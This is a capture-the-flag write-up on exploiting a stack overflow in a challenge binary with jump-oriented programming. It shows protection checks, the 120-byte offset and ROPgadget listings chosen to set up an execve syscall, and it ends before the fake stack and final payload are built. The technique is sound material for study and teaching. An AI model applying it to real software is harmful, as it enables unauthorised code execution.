# JOP:Solution

The binary is compiled with NX and Full RELRO
```
checksec chal.bin   
[*] '/root/workspace/vuln/jop/chal/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

and is dynamically linked to GLIBC.
```
rabin2 -I chal.bin 
arch     x86
baddr    0x400000
binsz    12587
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Debian 12.2.0-9) 12.2.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
```

We can exploit the read() function (shown in high level language).
```
00401228      puts(str: "--------------------------------…")
00401237      puts(str: "Pack it up, pack it in, let me b…")
00401246      puts(str: "I came to win, battle me, that's…")
00401255      puts(str: "I won't ever slack up, punk, ya …")
00401264      puts(str: "Try and play the role and yo, th…")
00401273      puts(str: "                             - \x1b…")
00401282      puts(str: "--------------------------------…")
0040129d      void var_c
0040129d      printf(format: "<<< Stack: %p\n", &var_c)
004012ac      puts(str: "--------------------------------…")
004012c0      printf(format: "So get out your seat and jump ar…")
004012dd      void var_78
004012dd      return read(fd: 0, buf: &var_78, nbytes: 136)
```

In the function above there space set aside for the user input using var_c and can be seen in the disassembly here:
```
0040121a  4883ec70           sub     rsp, 112
```

112 + 8 = 120 bytes to overwrite and to check we can run the program and test it. Using cyclic to spit out 120 characters the program ends normally, adding 1 causes a seg fault.
Therefore the overflow is at 120.

The goal is to get a shell to cat the flag so we need to set up a syscall to execve, which means we need to set RAX, RDI, RSI, and RDX. Then we need to create our fake stack.

First I looked to mov something into RAX
```
ROPgadget --binary chal.bin | grep mov | grep rax
0x0000000000401203 : mov byte ptr [rax], 0 ; add byte ptr [rax], al ; jmp rdx
0x0000000000401052 : mov ch, byte ptr [rdi] ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x00000000004011cb : mov ebp, esp ; mov rax, 0x3b ; jmp rdx
0x00000000004010c7 : mov edi, 0x404010 ; jmp rax
0x00000000004011cd : mov rax, 0x3b ; jmp rdx
```

The last gadget seemed promising so I checked what was being moved into RAX and 0x3b is 59, which is the syscall number for execve.

Next I looked for mov and RDI.
```
ROPgadget --binary chal.bin | grep mov | grep rdi
0x0000000000401052 : mov ch, byte ptr [rdi] ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x00000000004011db : mov ebp, esp ; mov rdi, rbp ; jmp rdx
0x00000000004011da : mov rbp, rsp ; mov rdi, rbp ; jmp rdx
0x00000000004011dd : mov rdi, rbp ; jmp rdx
```

The last gadget would move RBP into RDI, so I just needed to pop RBP.
```
0x000000000040113d : pop rbp ; ret
```

RSI was next.
```
ROPgadget --binary chal.bin | grep rsi
0x00000000004011ff : mov ebp, esp ; mov rsi, 0 ; jmp rdx
0x0000000000401201 : mov rsi, 0 ; jmp rdx
```

There were only 2 available gadgets and the second one made sense. 

Last is RDX. Every other gadget has a jmp back to RDX. We want to make sure that RDX is 0.
```
ROPgadget --binary chal.bin | grep rdx | grep xor
0x00000000004011f3 : mov ebp, esp ; xor rdx, rdx ; jmp rcx
0x00000000004011f2 : mov rbp, rsp ; xor rdx, rdx ; jmp rcx
0x00000000004011f1 : push rbp ; mov rbp, rsp ; xor rdx, rdx ; jmp rcx
0x00000000004011f5 : xor rdx, rdx ; jmp rcx
```

Using the last gadget would mean put RDX in RCX.
```
ROPgadget --binary chal.bin | grep mov | grep rcx
0x00000000004011e7 : mov ebp, esp ; mov rcx, rdx ; jmp rdx
0x00000000004011f3 : mov ebp, esp ; xor rdx, rdx ; jmp rcx
0x00000000004011e6 : mov rbp, rsp ; mov rcx, rdx ; jmp rdx
0x00000000004011f2 : mov rbp, rsp ; xor rdx, rdx ; jmp rcx
0x00000000004011e9 : mov rcx, rdx ; jmp rdx
```

Then it jumps back to RDX like every other gadget has so far. Last we needed to be able to add 8 to RSP to advance the program counter.
There was only one gadget that moved anything into RDX.
```
0x00000000004011b6 : mov rdx, 0x40119d ; jmp rdx
```

Looking at 0x40119d we see:
```
0040119d  4883c408           add     rsp, 8
004011a1  4d31c9             xor     r9, r9
004011a4  4983c108           add     r9, 0x8
004011a8  4901e1             add     r9 {arg1}, rsp
004011ab  41ff21             jmp     qword [r9 {arg1}]
```

Creating the fake stack is next, which we can do using the stack leak and a little bit of GDB analysis. 

